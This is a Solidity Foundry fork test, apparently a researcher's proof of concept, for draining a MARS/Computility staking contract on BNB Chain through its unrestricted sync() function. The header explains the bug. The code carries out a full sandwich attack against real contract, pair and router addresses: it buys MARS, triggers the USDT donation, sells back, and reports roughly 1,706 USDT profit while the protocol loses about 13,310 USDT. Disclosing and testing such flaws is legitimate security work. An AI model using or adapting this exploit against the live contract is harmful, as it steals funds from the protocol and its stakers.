// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Clean fork PoC for the permissionless sync() USDT-donation drain in the
// MARS/Computility Staking contract (BSC 0x550167...b12f), Staking.sol:664.
//
// Root cause: sync() is external with NO access control. It pushes the staking
// contract's ENTIRE USDT balance into the MARS/USDT PancakeV2 LP and calls
// pair.sync() -> a pure donation (no LP minted; project LP is burned to
// address(0)). Any EOA can sandwich that donation: buy MARS -> sync() -> sell
// MARS, capturing the donated USDT.
//
// Vulnerable source — sources/56_0x550167a2c39f9d70a5dc98abfa603bd4d1fab12f_contracts_Staking.sol:664
//     function sync() external {
//         uint256 w_bal = IERC20(USDT).balanceOf(address(this));
//         address pair = MARS.uniswapV2Pair();
//         IERC20(USDT).transfer(pair, w_bal);   // pure donation, no LP minted
//         IUniswapV2Pair(pair).sync();          // bakes it straight into reserves
//     }
//
// Harness forks via --fork-url + --fork-block-number 71845320 (NO createSelectFork
// here on purpose, so the runner controls the RPC — no RPC URL baked into source). At
// that block the staking contract holds ~13,310.8 USDT and the pair ~9,017 USDT / ~3.57M MARS.
//
// Run:  python run_fork_poc.py --test tests/MarsSyncDrainPoC.t.sol --chain 56 --fork-block 71845320
// Confirmed: attacker +~1,706 USDT on 8k capital; protocol loses the full ~13,310 USDT.
// Supersedes the earlier tests/TxSimulation.t.sol (removed: duplicate PoC + hardcoded ephemeral RPC URL).

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IStaking {
    function sync() external;
}

// Holds the MARS bought in the front-run, then hands it back to the attacker.
contract BuyHolder {
    address public immutable owner;
    constructor() { owner = msg.sender; }
    function sweep(address token) external {
        IERC20(token).transfer(owner, IERC20(token).balanceOf(address(this)));
    }
}

contract MarsSyncDrainPoC is Test {
    IERC20 constant MARS = IERC20(0xA8b9c16E2A95d045254996281C7496112e80192E);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IStaking constant STAKING = IStaking(0x550167A2C39F9d70A5DC98ABfA603bd4D1FAB12f);
    IUniswapV2Pair constant PAIR = IUniswapV2Pair(0x1389928c3C00b5022804e1E62cf8963C71A22067);
    IPancakeRouter constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    uint256 constant CAPITAL = 8000 * 1e18;
    uint256 constant BUY_LOOPS = 15;
    uint256 constant SELL_LOOPS = 7;
    uint256 constant SELL_CHUNK_DIV = 11;

    BuyHolder holder;

    function setUp() public {
        holder = new BuyHolder();
    }

    function test_sync_donation_drain() public {
        emit log_named_uint("Staking USDT at fork block", USDT.balanceOf(address(STAKING)) / 1e18);
        (uint112 r0, uint112 r1,) = PAIR.getReserves();
        emit log_named_uint("Pair USDT reserve", uint256(r0) / 1e18);
        emit log_named_uint("Pair MARS reserve", uint256(r1) / 1e18);

        deal(address(USDT), address(this), CAPITAL);
        uint256 capitalStart = USDT.balanceOf(address(this));
        require(capitalStart == CAPITAL, "deal failed");

        USDT.approve(address(ROUTER), type(uint256).max);
        MARS.approve(address(ROUTER), type(uint256).max);

        // ---- Front-run: buy MARS (into the holder) ----
        address[] memory buyPath = new address[](2);
        buyPath[0] = address(USDT);
        buyPath[1] = address(MARS);
        uint256 perBuy = CAPITAL / BUY_LOOPS;
        for (uint256 i = 0; i < BUY_LOOPS; i++) {
            ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                perBuy, 1, buyPath, address(holder), block.timestamp + 3600
            );
        }
        emit log_named_uint("MARS acquired", MARS.balanceOf(address(holder)) / 1e18);

        // ---- The bug: permissionless sync() donates staking's USDT to the LP ----
        uint256 stakingBefore = USDT.balanceOf(address(STAKING));
        STAKING.sync();
        uint256 stakingAfter = USDT.balanceOf(address(STAKING));
        emit log_named_uint("USDT donated by sync()", (stakingBefore - stakingAfter) / 1e18);
        assertEq(stakingAfter, 0, "sync() should empty the staking USDT balance");

        holder.sweep(address(MARS));

        // ---- Back-run: sell MARS into the now USDT-heavy pool ----
        address[] memory sellPath = new address[](2);
        sellPath[0] = address(MARS);
        sellPath[1] = address(USDT);
        for (uint256 i = 0; i < SELL_LOOPS; i++) {
            uint256 amountIn = MARS.balanceOf(address(PAIR)) / SELL_CHUNK_DIV;
            if (amountIn == 0 || MARS.balanceOf(address(this)) == 0) break;
            if (amountIn > MARS.balanceOf(address(this))) amountIn = MARS.balanceOf(address(this));
            try ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                amountIn, 1, sellPath, address(this), block.timestamp + 3600
            ) {} catch { break; }
        }

        uint256 finalUsdt = USDT.balanceOf(address(this));
        emit log_named_uint("Attacker USDT start", capitalStart / 1e18);
        emit log_named_uint("Attacker USDT end", finalUsdt / 1e18);
        if (finalUsdt > capitalStart) {
            emit log_named_uint("PROFIT (USDT)", (finalUsdt - capitalStart) / 1e18);
        }

        assertGt(finalUsdt, capitalStart, "no profit => not exploitable");
    }
}
